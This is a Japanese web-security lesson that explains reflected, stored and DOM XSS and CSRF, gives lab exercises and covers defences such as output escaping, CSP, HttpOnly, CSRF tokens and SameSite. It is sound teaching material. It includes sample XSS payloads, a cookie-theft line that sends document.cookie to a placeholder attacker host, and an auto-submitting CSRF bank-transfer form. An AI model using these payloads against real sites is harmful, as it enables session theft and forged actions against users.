# Lesson 06: XSS と CSRF

## 学習目標

- XSS の3タイプ(反射・格納・DOM)を原理から区別できる
- XSS を実際に再現し、出力エスケープ + CSP で直せる
- CSRF がなぜ「Cookie の自動送信」から生まれるかを理解する
- CSRF トークン・SameSite で防御できる
- XSS と CSRF の関係(XSS は CSRF 対策を無力化する)を説明できる

> 実習は隔離ラボ(Juice Shop / DVWA)で。

---

## 0. 舞台は「他人のブラウザ」

Lesson 05 のインジェクションは「サーバ側」で命令を混入させる攻撃でした。XSS と CSRF は舞台が違います——**被害者のブラウザ**が舞台です。

- **XSS**: 攻撃者の JavaScript を、**被害者のブラウザで実行させる**(同一オリジンの内側に侵入)
- **CSRF**: 被害者のブラウザに、**本人の意図しないリクエストを送らせる**(認証済みの権限を悪用)

Lesson 04 で学んだ「SOP は読めないが送れる」の非対称性を思い出してください。XSS は「読める場所(同一オリジン)で暴れる」攻撃、CSRF は「送れることを悪用する」攻撃。この対比が全体像です。

---

## 1. XSS(Cross-Site Scripting)の原理

**XSS の本質**は、Lesson 05 と同じく「データがコードとして解釈される」ことです。ただし解釈するのは DB ではなく**ブラウザ(HTML/JS)**です。

```
ユーザーが投稿したコメント: <script>alert(document.cookie)</script>
サーバがそのまま HTML に埋める:
  <div class="comment"><script>alert(document.cookie)</script></div>
→ そのページを開いた「全員」のブラウザでスクリプトが実行される
```

### なぜ危険か — 同一オリジンの内側だから

攻撃者のスクリプトは、**被害者が見ているページと同一オリジンで動きます**。つまり Lesson 04 の SOP の保護が、攻撃者側に働いてしまう。結果、そのスクリプトは:

- セッション Cookie を盗む(`HttpOnly` でなければ)→ なりすまし
- ページを書き換える(偽ログインフォームを表示)
- キー入力を盗む、勝手に操作する(被害者の権限で送金・投稿)
- 内部 API を叩く(被害者として認証済み)

XSS は「ブラウザ内での完全な乗っ取り」に近く、深刻度は非常に高いです。

---

## 2. XSS の3タイプ

### ① 反射型(Reflected)

リクエストに含めた入力が、その場のレスポンスに「反射」される。攻撃者は悪意ある URL を作り、被害者にクリックさせます。

```
検索ページ: https://site.com/search?q=入力
サーバ:     <p>「入力」の検索結果</p> をそのまま返す
攻撃 URL:   https://site.com/search?q=<script>...</script>
→ この URL を踏んだ人のブラウザでスクリプトが動く(メール/SNS で拡散)
```

### ② 格納型(Stored / Persistent)

入力が**サーバに保存**され、それを見た**全員**が被害を受ける。最も危険。

```
掲示板に <script>...</script> を投稿 → DB に保存
→ そのスレッドを開いた全ユーザーで実行(ワーム化することも)
```

### ③ DOM ベース(DOM-based)

サーバを経由せず、**クライアント側の JavaScript** が入力を安全でない形で DOM に書き込むことで発生。

```javascript
// ❌ 脆弱: URL のハッシュをそのまま innerHTML に
document.getElementById('out').innerHTML = location.hash.substring(1);
// https://site.com/#<img src=x onerror=alert(1)>
```

サーバ側のログには残らないため、発見が難しいのが特徴です。

## 3. ハンズオン: XSS を再現する

Juice Shop や DVWA(XSS ページ)で試します。

### DVWA(反射型・格納型)

1. DVWA の "XSS (Reflected)" ページで、入力欄に `<script>alert(document.domain)</script>`
2. アラートが出れば成立。`document.domain` が表示され、**そのサイトのオリジンで実行された**ことが分かる
3. "XSS (Stored)" で同じものを投稿 → ページを再読込した「全員」に出ることを確認
4. 難易度を Medium/High に上げ、どんなフィルタが入り、どう回避されるかを観察

### Cookie を盗む概念実証(ラボ内のみ)

```html
<!-- 実際の攻撃では Cookie を攻撃者サーバへ送る。ラボ内で概念だけ確認 -->
<script>new Image().src = 'http://攻撃者/steal?c=' + document.cookie;</script>
```

ここで `HttpOnly` の効果を体感します。Cookie に `HttpOnly` が付いていれば `document.cookie` に**セッションが現れない**——Lesson 04 の設定が、まさにこの窃取を防いでいます。

## 4. XSS の正しい対策

### 主対策: 文脈に応じた出力エスケープ(output encoding)

XSS 対策の要は「入力時」ではなく「**出力時**」です。データを HTML に出す瞬間に、その文脈に合わせて無害化します。

```
HTML 本文:  < → &lt;   > → &gt;   & → &amp;   " → &quot;
→ <script> は &lt;script&gt; になり、ただの文字として表示される(実行されない)
```

重要なのは「**出力先の文脈ごとにエスケープ方法が違う**」こと(理論):

| 出力先 | 必要なエスケープ |
|--------|----------------|
| HTML 本文 | HTML エンティティ化 |
| HTML 属性値 | 属性用エスケープ + 引用符必須 |
| JavaScript 内 | JS 文字列エスケープ(そもそも避ける) |
| URL パラメータ | URL エンコード |
| CSS 内 | CSS エスケープ |

### フレームワークを使う(現代の主流)

React・Vue・Angular などは、デフォルトで**自動エスケープ**します。だから普通に書けば XSS は起きません。ただし「エスケープを回避する API」に注意:

```jsx
// ✅ React はデフォルトで安全(自動エスケープ)
<div>{userInput}</div>

// ❌ 危険: 名前からして危険な dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Vue の v-html、Angular の [innerHTML]、素の innerHTML も同じく危険
```

### HTML を「許可したい」場合: サニタイズ

リッチテキスト投稿など、一部の HTML を許可したい場合は、**DOMPurify** のような実績あるサニタイザで、危険なタグ/属性だけを除去します。自作のブラックリストは必ず抜けます。

```javascript
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHtml);
```

### 多層防御: CSP + HttpOnly

- **CSP**(Lesson 04): エスケープ漏れがあっても、スクリプト実行自体をブロックする保険
- **Cookie に HttpOnly**: 万一 XSS されてもセッション Cookie を盗ませない

「エスケープ(主対策) + CSP + HttpOnly」の3枚重ねが、実務の標準的な守りです。

## 5. CSRF(Cross-Site Request Forgery)の原理

CSRF は XSS とまったく違う発想の攻撃です。**攻撃者のスクリプトは被害者のブラウザで動きません**。代わりに、Lesson 04 で伏線を張った「**Cookie は自動で送られる**」性質を悪用します。

```
1. 被害者は bank.com にログイン済み(セッション Cookie を保持)
2. 被害者が攻撃者のサイト evil.com を開く
3. evil.com に仕込まれた「自動送信フォーム」が bank.com へ送金リクエストを送る
4. ブラウザは bank.com 宛なので、Cookie を「自動で」付けて送信する
5. bank.com は「正規のログイン済みユーザーからの要求」と誤認し、送金を実行
```

```html
<!-- evil.com に仕込まれた罠(被害者が開くだけで送信される) -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="100000">
</form>
<script>document.getElementById('f').submit();</script>
```

### なぜ成立するのか(理論の核心)

Lesson 04 の SOP は「**レスポンスを読む**こと」を防ぎますが、「**リクエストを送る**こと」は防ぎません。CSRF はレスポンスを読む必要がありません——**送金が実行されれば目的達成**だからです。だから SOP をすり抜けます。これが「送れるが読めない」の非対称性が生む攻撃、と Lesson 04 で予告した正体です。

---

## 6. CSRF の対策

### ① CSRF トークン(同期トークンパターン)

サーバが「予測不可能な秘密のトークン」をフォームに埋め込み、送信時に照合します。攻撃者は**このトークンを知り得ない**(SOP でレスポンスを読めないため)ので、正しいトークンを付けられません。

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a1b2c3...ランダム">
  ...
</form>
```

```python
# サーバ側: トークンを照合。一致しなければ拒否
if request.form['csrf_token'] != session['csrf_token']:
    abort(403)
```

### ② SameSite Cookie(Lesson 04)

`SameSite=Lax`(現代の既定)または `Strict` にすると、**別サイト由来のリクエストに Cookie が付きません**。CSRF の前提(Cookie の自動送信)そのものを崩します。これだけでも多くの CSRF を防げますが、「保険を重ねる」意味でトークンと併用するのが堅実です。

### ③ その他

- **カスタムヘッダの要求**(`X-Requested-With` 等): 単純フォームからは付けられず、CORS の対象になる
- **重要操作での再認証**(パスワード再入力、送金確認)
- **GET で状態変更しない**: 副作用のある操作は必ず POST/PUT/DELETE(GET は画像タグ等で簡単に発火する)

## 7. XSS と CSRF の関係 — なぜ XSS はより深刻か

重要な洞察です。**XSS があると、CSRF 対策は無力化されます。**

```
CSRF トークンは「攻撃者がトークンを読めない」ことに依存する
   ↓
しかし XSS があれば、攻撃者のスクリプトは同一オリジンで動くので
トークンをページから読み取れる
   ↓
つまり XSS ができれば、CSRF トークンを盗んで正規リクエストを偽造できる
```

だから深刻度は **XSS > CSRF**。XSS は「同一オリジンの内側に入る」ため、他の多くの防御を突破する万能鍵になります。**XSS 対策は Web セキュリティの最優先事項の一つ**、という結論に至ります。

## 💡 コラム: 24時間で100万人を感染させた「Samy」の告白

2005年、当時19歳の **サミー・カムカー** は、SNS の草分け MySpace に、たった一つの巧妙なスクリプトを自分のプロフィールに仕込みました。それは格納型 XSS の一種で、こう動きました——**誰かが彼のプロフィールを閲覧すると、その人のプロフィールにも同じスクリプトがコピーされ、さらに彼を自動的に「友達」に追加し、プロフィールに "**but most of all, samy is my hero**(何よりも、サミーは俺のヒーロー)" と書き加える**。

つまり、閲覧した人が新たな感染源になる——**自己増殖するワーム**でした。結果は爆発的でした。公開からわずか20時間で、**100万人以上**がサミーを「ヒーロー」として友達登録し、MySpace はサイトを一時停止に追い込まれます。史上最速で広がったワームの一つとして記録されました。

カムカーはこの「いたずら」で家宅捜索を受け、有罪となり、数年間コンピュータの使用を制限されました。ここにも Lesson 00 の教訓が響きます——**意図が「悪ふざけ」でも、他人のシステムに影響を与えれば罪になる**。

しかし物語には続きがあります。彼はその後ホワイトハットのセキュリティ研究者となり、数々の重要な脆弱性を発見・公表し、業界で尊敬される存在になりました。Samy ワームが世界に残したのは、破壊の記憶だけではありません。それは「**格納型 XSS がいかに凶悪に増殖しうるか**」を全エンジニアに叩き込んだ、痛みを伴う教科書でした。あなたが `<div>{userInput}</div>` を安全に書くたび、100万人を巻き込んだあの20時間が、静かに繰り返されずに済んでいるのです。

## まとめ

| 概念 | 要点 |
|------|------|
| XSS 本質 | データがブラウザでコード(JS)として実行される |
| XSS 3タイプ | 反射(URL)/格納(保存・最凶)/DOM(クライアント側) |
| XSS 対策 | 出力エスケープ(文脈別)が主。フレームワーク自動エスケープ + CSP + HttpOnly |
| CSRF 本質 | Cookie の自動送信を悪用。被害者に意図しない要求を送らせる |
| CSRF 対策 | CSRF トークン + SameSite Cookie。GET で状態変更しない |
| 関係 | XSS があると CSRF トークンも盗まれる。XSS の方が深刻 |

---

## 確認問題

1. 反射型・格納型・DOM ベース XSS の違いを、それぞれどこに入力が「留まる」かに着目して説明してください。
2. XSS 対策が「入力時のフィルタ」ではなく「出力時のエスケープ」を主とすべき理由を説明してください。
3. `HttpOnly` 属性が XSS の被害をどのように軽減するか説明してください。XSS を「防ぐ」ものではない点にも触れてください。
4. CSRF が同一オリジンポリシーをすり抜けられる理由を、「送れるが読めない」の観点から説明してください。
5. CSRF トークンがなぜ攻撃を防げるのか、「攻撃者はなぜトークンを入手できないのか」に触れて説明してください。
6. 「XSS があると CSRF 対策が無力化する」とはどういうことか、具体的な流れを説明してください。
